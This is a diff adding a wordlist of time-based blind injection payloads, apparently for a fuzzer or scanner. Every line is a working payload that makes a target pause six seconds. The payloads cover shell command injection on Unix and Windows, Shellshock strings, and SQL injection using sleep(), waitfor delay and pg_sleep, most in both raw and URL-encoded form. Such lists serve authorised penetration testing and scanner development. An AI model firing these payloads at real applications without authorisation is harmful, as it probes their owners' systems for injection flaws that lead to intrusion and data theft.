@@ -1,0 +1,81 @@
+`sleep 6`
+%60sleep%206%60
+`sleep${IFS}6`
+%60sleep%24%7BIFS%7D6%60
+$(sleep 6)
+%24(sleep%206)
+$(sleep${IFS}6)
+%24(sleep%24%7BIFS%7D6)
+;system('Start-Sleep -s 6')
+%3Bsystem('Start-Sleep%20-s%206')
+;Start-Sleep -s 6|
+%3BStart-Sleep%20-s%206%7C
+|C:\Windows\System32\timeout.exe 6
+%7CC%3A%5CWindows%5CSystem32%5Ctimeout.exe%206
+|timeout 6|
+%7Ctimeout%206%7C
+`/usr/bin/sleep 6`
+%60%2Fusr%2Fbin%2Fsleep%206%60
+;sleep 6|
+%3Bsleep%206%7C
+() { :;}; /bin/bash -c "sleep 6"
+()%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fbash%20-c%20%22sleep%206%22
+() { :;}; /bin/bash -c \"sleep 6\"
+&& FOR /F "delims=" %i IN ('timeout 6') DO echo 1
+%26%26%20FOR%20%2FF%20%22delims%3D%22%20%25i%20IN%20('timeout%206')%20DO%20echo%201
+&& FOR /F \"delims=\" %i IN ('timeout 6') DO echo 1
+1 or sleep(6)#
+1%20or%20sleep(6)%23
+" or sleep(6)#
+%22%20or%20sleep(6)%23
+\" or sleep(6)#
+' or sleep(6)#
+'%20or%20sleep(6)%23
+1) or sleep(6)#
+1)%20or%20sleep(6)%23
+1)) or sleep(6)#
+1))%20or%20sleep(6)%23
+;waitfor delay '0:0:6'--
+%3Bwaitfor%20delay%20'0%3A0%3A6'--
+);waitfor delay '0:0:6'--
+)%3Bwaitfor%20delay%20'0%3A0%3A6'--
+';waitfor delay '0:0:6'--
+'%3Bwaitfor%20delay%20'0%3A0%3A6'--
+";waitfor delay '0:0:6'--
+%22%3Bwaitfor%20delay%20'0%3A0%3A6'--
+\";waitfor delay '0:0:6'--
+');waitfor delay '0:0:6'--
+')%3Bwaitfor%20delay%20'0%3A0%3A6'--
+");waitfor delay '0:0:6'--
+%22)%3Bwaitfor%20delay%20'0%3A0%3A6'--
+\");waitfor delay '0:0:6'--
+));waitfor delay '0:0:6'--
+))%3Bwaitfor%20delay%20'0%3A0%3A6'--
+'));waitfor delay '0:0:6'--
+'))%3Bwaitfor%20delay%20'0%3A0%3A6'--
+"));waitfor delay '0:0:6'--
+%22))%3Bwaitfor%20delay%20'0%3A0%3A6'--
+\"));waitfor delay '0:0:6'--
+pg_sleep(6)--
+pg_sleep(6)--
+1 or pg_sleep(6)--
+1%20or%20pg_sleep(6)--
+" or pg_sleep(6)--
+%22%20or%20pg_sleep(6)--
+\" or pg_sleep(6)--
+' or pg_sleep(6)--
+'%20or%20pg_sleep(6)--
+1) or pg_sleep(6)--
+1)%20or%20pg_sleep(6)--
+") or pg_sleep(6)--
+%22)%20or%20pg_sleep(6)--
+\") or pg_sleep(6)--
+') or pg_sleep(6)--
+')%20or%20pg_sleep(6)--
+1)) or pg_sleep(6)--
+1))%20or%20pg_sleep(6)--
+")) or pg_sleep(6)--
+%22))%20or%20pg_sleep(6)--
+\")) or pg_sleep(6)--
+')) or pg_sleep(6)--
+'))%20or%20pg_sleep(6)--
